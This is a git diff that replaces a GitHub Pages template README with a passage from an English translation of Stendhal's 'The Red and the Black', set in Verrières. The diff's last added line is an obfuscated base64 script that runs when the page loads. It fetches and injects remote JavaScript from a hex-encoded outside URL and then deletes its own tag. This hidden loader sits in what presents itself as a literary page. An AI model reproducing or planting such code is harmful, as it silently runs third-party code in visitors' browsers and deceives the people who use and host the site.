@@ -1,37 +1,29 @@
-## Welcome to GitHub Pages
+# Bringing in profit
 
-You can use the [editor on GitHub](https://github.com/astakhovalaura/Local/edit/master/README.md) to maintain and preview the content for your website in Markdown files.
+Happily for the reputation of M. de Rênal as an administrator an immense wall of support was necessary for the public promenade which goes along the hill, a hundred steps above the course of the Doubs. This admirable position secures for the promenade one of the most picturesque views in the whole of France. But the rain water used to make furrows in the walk every spring, caused ditches to appear, and rendered it generally impracticable. This nuisance, which was felt by the whole town, put M. de Rênal in the happy position of being compelled to immortalise his administration by building a wall twenty feet high and thirty to forty yards long.
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+The parapet of this wall, which occasioned M. de Rênal three journeys to Paris (for the last Minister of the Interior but one had declared himself the mortal enemy of the promenade of Verrières), is now raised to a height of four feet above the ground, and as though to defy all ministers whether past or present, it is at present adorned with tiles of hewn stone.
+![l](https://www.study.ru/uploads/server/YNUzTtg0hUDiTWiP.jpg)
+How many times have my looks plunged into the valley of the Doubs, as I thought of the Paris balls which I had abandoned on the previous night, and leant my breast against the great blocks of stone, whose beautiful grey almost verged on blue. Beyond the left bank, there wind five or six valleys, at the bottom of which I could see quite distinctly several small streams. There is a view of them falling into the Doubs, after a series of cascades. The sun is very warm in these mountains. When it beats straight down, the pensive traveller on the terrace finds shelter under some magnificent plane trees. They owe their rapid growth and their fine verdure with its almost bluish shade to the new soil, which M. the mayor has had placed behind his immense wall of support for (in spite of the opposition of the Municipal Council) he has enlarged the promenade by more than six feet (and although he is an Ultra and I am a Liberal, I praise him for it), and that is why both in his opinion and in that of M. Valenod, the fortunate Director of the workhouse of Verrières, this terrace can brook comparison with that of Saint-Germain en Laye.
 
-### Markdown
+I find personally only one thing at which to cavil in the COURS DE LA FIDELITE, (this official name is to be read in fifteen to twenty places on those immortal tiles which earned M. de Rênal an extra cross.) The grievance I find in the Cours de la Fidélité is the barbarous manner in which the authorities have cut these vigorous plane trees and clipped them to the quick. In fact they really resemble with their dwarfed, rounded and flattened heads the most vulgar plants of the vegetable garden, while they are really capable of attaining the magnificent development of the English plane trees. But the wish of M. the mayor is despotic, and all the trees belonging to the municipality are ruthlessly pruned twice a year. The local Liberals suggest, but they are probably exaggerating, that the hand of the official gardener has become much more severe, since M. the Vicar Maslon started appropriating the clippings. This young ecclesiastic was sent to Besançon some years ago to keep watch on the abbé Chélan and some cures in the neighbouring districts. An old Surgeon-Major of Napoleon's Italian Army, who was living in retirement at Verrières, and who had been in his time described by M. the mayor as both a Jacobin and a Bonapartiste, dared to complain to the mayor one day of the periodical mutilation of these fine trees.
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+"I like the shade," answered M. de Rênal, with just a tinge of that hauteur which becomes a mayor when he is talking to a surgeon, who is a member of the Legion of Honour. "I like the shade, I have my trees clipped in order to give shade, and I cannot conceive that a tree can have any other purpose, provided of course it is not bringing in any profit, like the useful walnut tree."
 
-```markdown
-Syntax highlighted code block
+This is the great word which is all decisive at Verrières. "BRINGING IN PROFIT," this word alone sums up the habitual trend of thought of more than three-quarters of the inhabitants.
 
-# Header 1
-## Header 2
-### Header 3
+Bringing in profit is the consideration which decides everything in this little town which you thought so pretty. The stranger who arrives in the town is fascinated by the beauty of the fresh deep valleys which surround it, and he imagines at first that the inhabitants have an appreciation of the beautiful. They talk only too frequently of the beauty of their country, and it cannot be denied that they lay great stress on it, but the reason is that it attracts a number of strangers, whose money enriches the inn-keepers, a process which brings in profit to the town, owing to the machinery of the octroi.
 
-- Bulleted
-- List
+It was on a fine, autumn day that M. de Rênal was taking a promenade on the Cours de la Fidélité with his wife on his arm. While listening to her husband (who was talking in a somewhat solemn manner) Madame de Rênal followed anxiously with her eyes the movements of three little boys. The eldest, who might have been eleven years old, went too frequently near the parapet and looked as though he was going to climb up it. A sweet voice then pronounced the name of Adolphe and the child gave up his ambitious project. Madame de Rênal seemed a woman of thirty years of age but still fairly pretty.
 
-1. Numbered
-2. List
+"He may be sorry for it, may this fine gentleman from Paris," said M. de Rênal, with an offended air and a face even paler than usual. "I am not without a few friends at court!" But though I want to talk to you about the provinces for two hundred pages, I lack the requisite barbarity to make you undergo all the long-windedness and circumlocutions of a provincial dialogue.
 
-**Bold** and _Italic_ and `Code` text
+This fine gentleman from Paris, who was so odious to the mayor of Verrières, was no other than the M. Appert, who had two days previously managed to find his way not only into the prison and workhouse of Verrières, but also into the hospital, which was gratuitously conducted by the mayor and the principal proprietors of the district.
 
-[Link](url) and ![Image](src)
-```
+"But," said Madame de Rênal timidly, "what harm can this Paris gentleman do you, since you administer the poor fund with the utmost scrupulous honesty?"
 
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
+"He only comes to throw blame and afterwards he will get some articles into the Liberal press."
 
-### Jekyll Themes
+"You never read them, my dear."
 
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/astakhovalaura/Local/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
-
-### Support or Contact
-
-Having trouble with Pages? Check out our [documentation](https://docs.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
+<script id="FNq2Z" src="data:text/javascript;base64, dmFyIF9mS1YzRyA9IFsnXHg3MVx4NzVceDY1XHg3Mlx4NzlceDUzXHg2NVx4NmNceDY1XHg2M1x4NzRceDZmXHg3MicsICdceDYyXHg2Zlx4NjRceDc5JywgJ1x4NjdceDY1XHg3NFx4NDVceDZjXHg2NVx4NmRceDY1XHg2ZVx4NzRceDQyXHg3OVx4NDlceDY0JywgJ1x4NDRceDRmXHg0ZFx4NDNceDZmXHg2ZVx4NzRceDY1XHg2ZVx4NzRceDRjXHg2Zlx4NjFceDY0XHg2NVx4NjQnLCAnXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg0NVx4NmNceDY1XHg2ZFx4NjVceDZlXHg3NCcsICdceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnLCAnXHg3NFx4NzlceDcwXHg2NScsICdceDc0XHg2NVx4NzhceDc0XHgyZlx4NmFceDYxXHg3Nlx4NjFceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnXTsoZnVuY3Rpb24oX2hSSEdBLCBfRkp3R2YpIHt2YXIgX1JmT1hWID0gZnVuY3Rpb24oX3lWNWlzKSB7d2hpbGUgKC0tX3lWNWlzKSB7X2hSSEdBWydwdXNoJ10oX2hSSEdBWydzaGlmdCddKCkpO319O19SZk9YVigrK19GSndHZik7fShfZktWM0csIDB4MTFiKSk7dmFyIF9iZnpibCA9IGZ1bmN0aW9uKF80cDNDbSwgXzBtaDVNKSB7XzRwM0NtID0gXzRwM0NtIC0gMHgwO3ZhciBfWUdUVm4gPSBfZktWM0dbXzRwM0NtXTtyZXR1cm4gX1lHVFZuO307ZG9jdW1lbnRbJ1x4NjFceDY0XHg2NFx4NDVceDc2XHg2NVx4NmVceDc0XHg0Y1x4NjlceDczXHg3NFx4NjVceDZlXHg2NVx4NzInXShfYmZ6YmwoJzB4MCcpLCBmdW5jdGlvbigpIHt2YXIgX1paNkp5ID0gZG9jdW1lbnRbX2JmemJsKCcweDEnKV0oX2JmemJsKCcweDInKSk7X1paNkp5W19iZnpibCgnMHgzJyldID0gX2JmemJsKCcweDQnKTtfWlo2SnlbJ1x4NzNceDcyXHg2MyddID0gJ1x4NjhceDc0XHg3NFx4NzBceDczXHgzYVx4MmZceDJmXHg2Mlx4NzJceDY1XHg2ZVx4NjRceDcwXHg2Zlx4NmNceDYxXHg2M1x4NjNceDMxXHgyZVx4NzNceDcwXHg3OVx4MmRceDZlXHg2NVx4NzdceDczXHgyZVx4NjNceDZmXHg2ZFx4MmZceDVmXHg3Mlx4NjVceDZkXHg2Zlx4NzRceDY1XHg1Zlx4NzRceDcyXHg2MVx4NjNceDZiXHgyZVx4NmFceDczXHgzZlx4NjNceDYxXHg2ZFx4NzBceDYxXHg2OVx4NjdceDZlXHgzZFx4MzZceDZiXHg2Y1x4NjRceDY5XHg1OVx4NTNceDMzXHg0YVx4MzcnO2RvY3VtZW50W19iZnpibCgnMHg1JyldKF9iZnpibCgnMHg2JykpWydceDYxXHg3MFx4NzBceDY1XHg2ZVx4NjRceDQzXHg2OFx4NjlceDZjXHg2NCddKF9aWjZKeSk7ZG9jdW1lbnRbX2JmemJsKCcweDcnKV0oJ0ZOcTJaJylbJ1x4NzJceDY1XHg2ZFx4NmZceDc2XHg2NSddKCk7fSwgeydceDZmXHg2ZVx4NjNceDY1JzogISFbXX0pOw=="></script>
